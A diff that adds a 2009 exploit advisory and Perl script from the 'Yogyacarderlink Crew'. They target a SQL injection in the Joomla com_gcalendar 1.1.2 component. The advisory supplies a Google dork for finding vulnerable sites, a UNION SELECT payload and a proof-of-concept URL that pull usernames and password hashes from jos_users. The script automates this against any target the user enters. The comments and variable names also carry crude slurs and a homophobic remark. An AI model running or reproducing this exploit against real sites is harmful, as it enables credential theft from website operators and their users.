@@ -1,0 +1,98 @@
+ __   __  ___    ___  __   __  ___    ___    ___    ___    ___    ___    ___    _      ___   _  _   _  __  
+ \ \ / / / _ \  / __| \ \ / / /   \  / __|  /   \  | _ \  |   \  | __|  | _ \  | |    |_ _| | \| | | |/ /  
+  \ V / | (_) || (_ |  \ V /  | - | | (__   | - |  |   /  | |) | | _|   |   /  | |__   | |  | .` | | ' <   
+  _|_|_  \___/  \___|  _|_|_  |_|_|  \___|  |_|_|  |_|_\  |___/  |___|  |_|_\  |____| |___| |_|\_| |_|\_\  
+_| """ ||"""""||"""""|| """ ||"""""||"""""||"""""||"""""||"""""||"""""||"""""||"""""||"""""||"""""||"""""| 
+"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`
+----------------------------------------------------------------------------------------------------------
+[o] Joomla Component com_gcalendar 1.1.2 (gcid) Remote SQL Injection Vulnerability
+
+			--==[ Author ]==--
+# Author	: Yogyacarderlink Crew
+# Group		: YOGYACARDERLINK
+# Site		: http://yogyacarderlink.web.id/
+# Date		: November, 26-2009 [INDONESIA]
+
+ 
+Remote SQL Injection were identified in Google Calendar Joomla Component
+
+Application: 		Google Calendar Component
+Versions Affected: 	v1.1.2 old versions may also be affected
+Download: 		http://extensions.joomla.org/extensions/calendars-a-events/calendars/4188
+License: 		GPL
+Vulnerable: 		Remote SQL Injection
+Google Dork: 		inurl:"com_gcalendar"
+
+
+Description
+***********
+
+Google Calendar is a component that will allow you to embed Google Calendars on your Joomla 1.5 site with ease!
+You'll be amazed at the flexibility allowed and the degree of customization.
+
+Details
+*******
+
+[!] SQL Injection
+attacks are another instantiation of injection attack,
+in which SQL commands are injected into data-plane input in order to effect the execution of predefined SQL commands
+
+Exploit
+*******
+
+-9999+union+select+0,concat(username,0x3a,password),2,3,4+from+jos_users--
+
+
+Proof of Concept
+****************
+
+http://server/index.php?option=com_gcalendar&view=event&eventID=peler&start=memek&end=kentu&gcid=2+AND+1=2+UNION+SELECT+0,concat(username,0x3a,password),2,3,4+from+jos_users--
+
+-------------------------------------------------------------------------
+#!/usr/bin/perl -w
+
+#Joomla com_gcalendar (gcid) Sql injection
+#Coded by v3n0m
+#Gre4tz: All Yogyacarderlink Crew
+#Special Gre4tz: Google
+
+print "|----------------------------------------------------|\n";
+print "|   YOGYACARDERLINK 'com_gcalendar Remote Injector'  |\n";
+print "| Coded by : v3n0m                                   |\n";
+print "| Greetz   : LeQhi (bug founder)                     |\n";
+print "| sHoutz   : Yogyacarderlink Crew                    |\n";
+print "|                                                    |\n";
+print "|   -v3n0m & lingah paling ganteng se-jogjakarta-     |\n";
+print "|                                                    |\n";
+print "|                         www.yogyacarderlink.web.id |\n";
+print "|----------------------------------------------------|\n";
+use LWP::UserAgent;
+print "\nMasukin Target:[http://wwww.target.com/path/]: ";
+chomp(my $target=<STDIN>);
+#Nama Column
+$kontol="group_concat(username,0x3a,password)";
+#Nama Table
+$memek="jos_users";
+$ngentot="-9999+union+select+";
+$b = LWP::UserAgent->new() or die "Could not initialize browser\n";
+$b->agent('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)');
+$host = $target . "index.php?option=com_gcalendar&view=event&eventID=peler&start=memek&end=kentu&gcid=".$ngentot."0,".$kontol.",2,3,4+from/**/".$memek."+--+";
+$res = $b->request(HTTP::Request->new(GET=>$host));
+$answer = $res->content; if ($answer =~/([0-9a-fA-F]{32})/){
+print "\n[+] Admin Hash : $1\n\n";
+print "Sukses coy !! Wah selamat yee bro...\n";
+print "Coba langsung dicheck ke TKP aja bro biar lebih yakin...\n";
+print "\n";
+print "Attention:\n";
+print "v3n0m & lingah emang paling ganteng...\n";
+print "Yang kaga setuju/protes = GAY !!\n";
+print "\n";
+}
+else{print "\n[-] wah gagal bro (Belom Cebok tangan lo)...\n";
+}
+
+-------------------------------------------------------------------------
+
+Thankz	  : lingah,aRiee,v3n0m,z0mb13,m4rco,NaZmy,IdioT_InsidE,eidelweiss
+	    JaLi-,yoga0400,Anak_Naga_,badkiddies,g0nz,mywisdom,setanmuda
+	    jo8928,ripper_maya,elv1n4,dhit_coxon and all YOGYACARDERLINK crew
